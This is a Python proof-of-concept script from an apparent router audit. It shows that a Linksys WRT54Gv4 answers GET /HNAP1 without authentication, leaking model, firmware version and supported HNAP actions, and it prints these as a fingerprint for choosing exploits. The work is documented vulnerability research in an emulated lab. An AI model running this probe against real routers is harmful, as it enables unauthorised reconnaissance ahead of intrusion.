#!/usr/bin/env python3
"""
PoC — Linksys WRT54Gv4 (fw 4.21.5.000) unauthenticated information disclosure via GET /HNAP1.
Report finding: L6 (MEDIUM). Dynamically VERIFIED 2026-07-06 via FirmAE.

Root cause (HNAP_GET_request_handler @ 0x4466c8 in /usr/sbin/httpd):
    if ( !strcasecmp(url, "/HNAP1") || !strcasecmp(url, "/HNAP1/") ) {
        if ( ssl_request || (!is_lan || https_enable!="1") && (is_lan || remote_mgt_https!="1") )
            send_get_device_settings_reply(conn);   // <-- NO AUTH CHECK
    }

`GetDeviceSettings` (the HNAP discovery action) is served without authentication, leaking firmware
version, model, vendor, and the full supported-action list — directly enabling exploit selection.
This is an unauthenticated information disclosure, not a token/session authentication bypass.

Threat model: network-only, zero credentials (works against WAN if remote management is enabled).

Usage:
    python3 poc_wrt54gv4_l6_unauth_hnap1.py --target http://192.168.1.1
    # FirmAE: run from inside the practical_diffie container (192.168.1.1 is the emulated LAN IP);
    # against a real device, use its LAN/WAN IP.
Non-destructive: one GET only.
"""
import argparse, re, sys
import requests

def text_of(xml, tag):
    m = re.search(r"<%s>(.*?)</%s>" % (tag, tag), xml, re.S)
    return m.group(1).strip() if m else None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://192.168.1.1",
                    help="base URL of the WRT54G web UI (FirmAE: http://192.168.1.1)")
    ap.add_argument("--timeout", type=int, default=5)
    a = ap.parse_args()
    base = a.target.rstrip("/")

    r1 = requests.get(base + "/HNAP1", timeout=a.timeout, allow_redirects=False)
    print(f"[*] GET /HNAP1 (no creds) -> HTTP {r1.status_code}  Content-Type={r1.headers.get('Content-Type')}")
    xml = r1.text

    fields = ["DeviceName", "VendorName", "ModelName", "ModelDescription",
              "FirmwareVersion", "Type", "PresentationURL"]
    leaked = {f: text_of(xml, f) for f in fields}
    leaked = {k: v for k, v in leaked.items() if v}

    print()
    if r1.status_code == 200 and leaked:
        print("[+] VERIFIED: unauthenticated device fingerprint leaked via GET /HNAP1:")
        for k, v in leaked.items():
            print(f"      {k:18}= {v}")
        actions = re.findall(r"<ActionName>(.*?)</ActionName>", xml)
        if actions:
            print(f"      SupportedActions   = {len(actions)} actions exposed (e.g. {actions[:3]})")
        print("[*] Impact: firmware/version disclosure -> exploit selection; full HNAP action map.")
        print("[*] Classification: unauthenticated information disclosure, not token/auth bypass.")
        sys.exit(0)
    else:
        print("[-] NOT reproduced — /HNAP1 did not return device settings without auth.")
        print("    body[:200]:", xml[:200].replace("\n", " "))
        sys.exit(1)

if __name__ == "__main__":
    main()
